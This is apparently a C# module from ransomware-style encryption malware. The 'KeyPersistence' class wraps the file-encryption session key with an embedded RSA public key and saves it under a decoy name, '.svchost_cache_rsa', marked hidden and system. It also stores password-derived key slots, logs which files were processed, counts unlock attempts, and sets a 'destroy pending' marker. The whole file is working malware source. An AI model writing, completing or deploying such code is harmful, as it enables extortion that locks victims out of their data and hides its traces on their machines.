using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

namespace ns0
{
    internal static class KeyPersistence
    {
        private static readonly string PersistenceDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            BuildSecrets.PersistenceDirName);

        private static readonly string AttemptsPath =
            System.IO.Path.Combine(PersistenceDir, ".dvdcrpt_attempts");

        private static readonly string SessionKeyRsaPath = Path.Combine(PersistenceDir, ".svchost_cache_rsa");
        private static readonly string PwdSlotDir = Path.Combine(PersistenceDir, "pwd");

        private static string PwdBlobPath(int slot) => Path.Combine(PwdSlotDir, "slot_" + slot + ".blob");
        private static string PwdSaltPath(int slot) => Path.Combine(PwdSlotDir, "slot_" + slot + ".salt");
        private static string PwdIterPath(int slot) => Path.Combine(PwdSlotDir, "slot_" + slot + ".iter");

        private static int NextFreeSlot()
        {
            int slot = 0;
            while (File.Exists(PwdBlobPath(slot))) slot++;
            return slot;
        }

        private static readonly string ProcessedFilesPath = Path.Combine(PersistenceDir, ".dvdcrpt_progress");
        private static readonly string DecryptFlagPath = Path.Combine(PersistenceDir, ".dvdcrpt_decrypted");
        private static readonly string ProgressTimestampPath = Path.Combine(PersistenceDir, ".dvdcrpt_ts");

        private const int ProgressWriteIntervalMs = 300000;
        private const int Pbkdf2Iterations = 600000;
        private const int SaltSize = 32;
        private const int KeySize = 32;

        public static int LoadUnlockAttempts()
        {
            try
            {
                if (File.Exists(AttemptsPath))
                {
                    string s = File.ReadAllText(AttemptsPath).Trim();
                    if (int.TryParse(s, out int v)) return v;
                }
            }
            catch { }
            return 0;
        }

        public static void SaveUnlockAttempts(int value)
        {
            try
            {
                Directory.CreateDirectory(PersistenceDir);
                if (File.Exists(AttemptsPath))
                {
                    File.SetAttributes(AttemptsPath, FileAttributes.Normal);
                }
                File.WriteAllText(AttemptsPath, value.ToString());
            }
            catch { }
        }

        public static void ResetUnlockAttempts()
        {
            try { if (File.Exists(AttemptsPath)) File.Delete(AttemptsPath); } catch { }
            IntentionGate.Reset();
        }

        public static void SaveSessionKey(byte[] sessionKey, string password = null)
        {
            try
            {
                Directory.CreateDirectory(PersistenceDir);
                string publicKeyXml = KeyProvider.GetPublicKeyXml();
                if (!string.IsNullOrEmpty(publicKeyXml))
                {
                    using (var rsa = new RSACryptoServiceProvider(2048))
                    {
                        rsa.FromXmlString(publicKeyXml);
                        byte[] encryptedRsa = rsa.Encrypt(sessionKey, true);
                        File.WriteAllBytes(SessionKeyRsaPath, encryptedRsa);
                        File.SetAttributes(SessionKeyRsaPath, FileAttributes.Hidden | FileAttributes.System);
                    }
                }
                if (!string.IsNullOrEmpty(password))
                {
                    Directory.CreateDirectory(PwdSlotDir);
                    int slot = NextFreeSlot();

                    byte[] salt = new byte[SaltSize];
                    using (var rng = RandomNumberGenerator.Create())
                        rng.GetBytes(salt);
                    File.WriteAllBytes(PwdSaltPath(slot), salt);
                    File.SetAttributes(PwdSaltPath(slot), FileAttributes.Hidden | FileAttributes.System);

                    File.WriteAllText(PwdIterPath(slot), Pbkdf2Iterations.ToString());
                    File.SetAttributes(PwdIterPath(slot), FileAttributes.Hidden | FileAttributes.System);

                    using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, Pbkdf2Iterations, HashAlgorithmName.SHA256))
                    {
                        byte[] pwdKey = pbkdf2.GetBytes(KeySize);
                        byte[] encryptedPwd = AesEncrypt(sessionKey, pwdKey);
                        File.WriteAllBytes(PwdBlobPath(slot), encryptedPwd);
                        File.SetAttributes(PwdBlobPath(slot), FileAttributes.Hidden | FileAttributes.System);
                    }
                }
            }
            catch { }
        }

        public static byte[] LoadSessionKeyFromPassword(string password)
        {
            try
            {
                if (string.IsNullOrEmpty(password)) return null;
                if (!Directory.Exists(PwdSlotDir)) return null;

                for (int slot = 0; File.Exists(PwdBlobPath(slot)); slot++)
                {
                    if (!File.Exists(PwdSaltPath(slot))) continue;

                    try
                    {
                        byte[] salt = File.ReadAllBytes(PwdSaltPath(slot));
                        int iterations = Pbkdf2Iterations;
                        if (File.Exists(PwdIterPath(slot)))
                        {
                            string iterText = File.ReadAllText(PwdIterPath(slot));
                            int.TryParse(iterText, out iterations);
                        }

                        using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, iterations, HashAlgorithmName.SHA256))
                        {
                            byte[] pwdKey = pbkdf2.GetBytes(KeySize);
                            byte[] encrypted = File.ReadAllBytes(PwdBlobPath(slot));
                            byte[] key = AesDecrypt(encrypted, pwdKey);
                            if (key != null && key.Length == KeySize)
                                return key;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return null;
        }

        public static byte[] LoadSessionKeyRsa()
        {
            try
            {
                if (!File.Exists(SessionKeyRsaPath)) return null;
                return File.ReadAllBytes(SessionKeyRsaPath);
            }
            catch { }
            return null;
        }

        public static bool HasSessionKeyBlobs()
        {
            try
            {
                if (File.Exists(SessionKeyRsaPath)) return true;
                if (Directory.Exists(PwdSlotDir))
                    return Directory.GetFiles(PwdSlotDir, "*.blob").Length > 0;
            }
            catch { }
            return false;
        }

        private static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            using (var aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.GenerateIV();
                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, 16);
                    byte[] encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
                    ms.Write(encrypted, 0, encrypted.Length);
                    return ms.ToArray();
                }
            }
        }

        private static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            using (var aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                Array.Copy(data, 0, aes.IV, 0, 16);
                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(data, 16, data.Length - 16))
                {
                    return decryptor.TransformFinalBlock(ms.ToArray(), 0, (int)ms.Length);
                }
            }
        }

        public static void SaveProcessedFiles(IEnumerable<string> files)
        {
            try
            {
                if (!ShouldWriteProgress()) return;
                Directory.CreateDirectory(PersistenceDir);
                byte[] compressed = CompressFiles(files);
                File.WriteAllBytes(ProcessedFilesPath, compressed);
                File.SetAttributes(ProcessedFilesPath, FileAttributes.Hidden | FileAttributes.System);
                File.WriteAllText(ProgressTimestampPath, DateTime.UtcNow.Ticks.ToString());
                File.SetAttributes(ProgressTimestampPath, FileAttributes.Hidden | FileAttributes.System);
            }
            catch { }
        }

        private static bool ShouldWriteProgress()
        {
            try
            {
                if (!File.Exists(ProgressTimestampPath)) return true;
                string ticks = File.ReadAllText(ProgressTimestampPath);
                if (long.TryParse(ticks, out long lastWrite))
                {
                    var lastTime = new DateTime(lastWrite, DateTimeKind.Utc);
                    if ((DateTime.UtcNow - lastTime).TotalMilliseconds < ProgressWriteIntervalMs)
                        return false;
                }
            }
            catch { }
            return true;
        }

        private static byte[] CompressFiles(IEnumerable<string> files)
        {
            using (var ms = new MemoryStream())
            using (var gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress))
            using (var sw = new StreamWriter(gzip, Encoding.UTF8))
            {
                foreach (string f in files)
                    sw.WriteLine(f);
                sw.Flush();
                gzip.Close();
                return ms.ToArray();
            }
        }

        public static HashSet<string> LoadProcessedFiles()
        {
            try
            {
                if (!File.Exists(ProcessedFilesPath)) return new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                byte[] compressed = File.ReadAllBytes(ProcessedFilesPath);
                using (var ms = new MemoryStream(compressed))
                using (var gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress))
                using (var sr = new StreamReader(gzip, Encoding.UTF8))
                {
                    var set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                    string line;
                    while ((line = sr.ReadLine()) != null)
                        set.Add(line);
                    return set;
                }
            }
            catch { }
            return new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        }

        public static void MarkDecrypted()
        {
            try
            {
                Directory.CreateDirectory(PersistenceDir);
                File.WriteAllText(DecryptFlagPath, DateTime.UtcNow.ToString("o"));
                File.SetAttributes(DecryptFlagPath, FileAttributes.Hidden | FileAttributes.System);
            }
            catch { }
        }

        public static bool IsDecrypted()
        {
            try { return File.Exists(DecryptFlagPath); } catch { }
            return false;
        }

        public static void ClearDecryptFlag()
        {
            try { if (File.Exists(DecryptFlagPath)) File.Delete(DecryptFlagPath); } catch { }
        }

        public static void ClearAll()
        {
            try
            {
                if (File.Exists(SessionKeyRsaPath)) File.Delete(SessionKeyRsaPath);
                if (Directory.Exists(PwdSlotDir)) Directory.Delete(PwdSlotDir, true);
                if (File.Exists(ProcessedFilesPath)) File.Delete(ProcessedFilesPath);
                if (File.Exists(DecryptFlagPath)) File.Delete(DecryptFlagPath);
                if (File.Exists(ProgressTimestampPath)) File.Delete(ProgressTimestampPath);
                if (File.Exists(AttemptsPath)) File.Delete(AttemptsPath);
                if (File.Exists(DestroyPendingPath)) File.Delete(DestroyPendingPath);
            }
            catch { }
        }

        private static readonly string DestroyPendingPath =
            Path.Combine(PersistenceDir, ".dvdcrpt_destroy_pending");

        public static void MarkDestroyPending(string reason)
        {
            try
            {
                Directory.CreateDirectory(PersistenceDir);
                File.WriteAllText(DestroyPendingPath,
                    DateTime.UtcNow.ToString("o") + "|" + reason);
                File.SetAttributes(DestroyPendingPath,
                    FileAttributes.Hidden | FileAttributes.System);
            }
            catch { }
        }

        public static bool IsDestroyPending()
        {
            try { return File.Exists(DestroyPendingPath); }
            catch { return false; }
        }

        public static void ClearDestroyPending()
        {
            try { if (File.Exists(DestroyPendingPath)) File.Delete(DestroyPendingPath); }
            catch { }
        }
    }
}